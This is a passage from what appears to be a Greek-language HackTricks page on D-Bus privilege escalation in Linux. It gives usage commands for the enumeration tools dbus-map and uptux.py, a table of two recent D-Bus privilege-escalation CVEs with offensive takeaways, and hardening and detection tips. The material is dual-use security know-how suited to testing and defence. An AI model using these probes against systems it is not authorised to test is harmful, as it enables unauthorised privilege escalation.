  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Το εργαλείο επισημαίνει με `!` τα μη προστατευμένα well-known names, αποκαλύπτοντας άμεσα υπηρεσίες που μπορείτε να *καταλάβετε* (take over) ή κλήσεις μεθόδων που είναι προσβάσιμες από ένα μη προνομιούχο shell.

### uptux.py
* Συγγραφέας: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script αποκλειστικά σε Python που αναζητά *εγγράψιμα* paths σε μονάδες systemd **και** αρχεία πολιτικής D-Bus με υπερβολικά χαλαρά δικαιώματα (π.χ. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Γρήγορη χρήση:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Το module D-Bus αναζητά στους παρακάτω καταλόγους και επισημαίνει κάθε service που μπορεί να γίνει spoof ή hijack από έναν απλό χρήστη:
  * `/etc/dbus-1/system.d/` και `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Αξιοσημείωτα σφάλματα κλιμάκωσης προνομίων στο D-Bus (2024-2025)

Η παρακολούθηση των CVE που δημοσιεύτηκαν πρόσφατα βοηθά στον εντοπισμό παρόμοιων μη ασφαλών μοτίβων σε custom κώδικα. Δύο καλά πρόσφατα παραδείγματα είναι τα εξής:<sup>[[2]](#references)[[3]](#references)</sup>

| Έτος | CVE | Component | Βασική αιτία | Επιθετικό δίδαγμα |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Το service που εκτελούνταν ως root εξέθετε ένα D-Bus interface, το οποίο μπορούσαν να επαναρυθμίσουν μη προνομιούχοι χρήστες, μεταξύ άλλων φορτώνοντας συμπεριφορά macro που ελεγχόταν από τον attacker. | Αν ένας daemon εκθέτει **διαχείριση συσκευών/profiles/configuration** στο system bus, αντιμετωπίστε τις δυνατότητες εγγραφής configuration και macro ως primitives εκτέλεσης κώδικα, όχι απλώς ως «ρυθμίσεις». |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ένα compatibility proxy που εκτελούνταν ως root προωθούσε αιτήματα σε backend services χωρίς να διατηρεί το security context του αρχικού caller, με αποτέλεσμα τα backends να εμπιστεύονται το proxy ως UID 0. | Αντιμετωπίζετε τα D-Bus services τύπου **proxy / bridge / compatibility** ως ξεχωριστή κατηγορία bugs: αν προωθούν προνομιούχες κλήσεις, επαληθεύστε πώς μεταφέρεται το UID/Polkit context του caller στο backend. |

Μοτίβα που αξίζει να προσέξετε:
1. Το service εκτελείται **ως root στο system bus**.
2. Είτε **δεν υπάρχει έλεγχος εξουσιοδότησης**, είτε ο έλεγχος γίνεται με βάση το **λάθος υποκείμενο**.
3. Η προσβάσιμη μέθοδος τελικά αλλάζει την κατάσταση του συστήματος: εγκατάσταση πακέτων, αλλαγές χρηστών/ομάδων, configuration bootloader, ενημερώσεις device profile, εγγραφές αρχείων ή άμεση εκτέλεση εντολών.

Χρησιμοποιήστε `dbusmap --enable-probes` ή χειροκίνητα `busctl call` για να επιβεβαιώσετε αν είναι προσβάσιμη μια μέθοδος και, στη συνέχεια, εξετάστε το policy XML του service και τις ενέργειες Polkit για να κατανοήσετε **ποιο υποκείμενο** εξουσιοδοτείται στην πραγματικότητα.

---

## Γρήγορες βελτιώσεις για hardening και detection

* Αναζητήστε policies με δικαιώματα εγγραφής για όλους ή ανοιχτά *send/receive*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Απαιτήστε Polkit για επικίνδυνες μεθόδους — ακόμη και τα *root* proxies πρέπει να περνούν το PID του *caller* στη `polkit_authority_check_authorization_sync()` αντί για το δικό τους.
* Μειώστε τα privileges σε helpers μακράς εκτέλεσης (χρησιμοποιήστε το `sd_pid_get_owner_uid()` για να αλλάξετε namespaces μετά τη σύνδεση στο bus).
* Αν δεν μπορείτε να καταργήσετε μια υπηρεσία, τουλάχιστον περιορίστε την σε μια αποκλειστική ομάδα Unix και περιορίστε την πρόσβαση στην πολιτική XML της.
* Blue-team: καταγράψτε το system bus με `busctl capture > /var/log/dbus_$(date +%F).pcapng` και εισαγάγετέ το στο Wireshark για ανίχνευση ανωμαλιών.

---

## References

- [1] [Κλιμάκωση προνομίων μέσω D-Bus στο USBCreator του Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: Η υπηρεσία D-Bus επιτρέπει τη ρύθμιση παραμέτρων από οποιονδήποτε μη προνομιούχο χρήστη](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Παράκαμψη ελέγχου ταυτότητας στην υπηρεσία D-Bus Proxy του Deepin (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - «Nmap για D-Bus»](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - Τεκμηρίωση D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
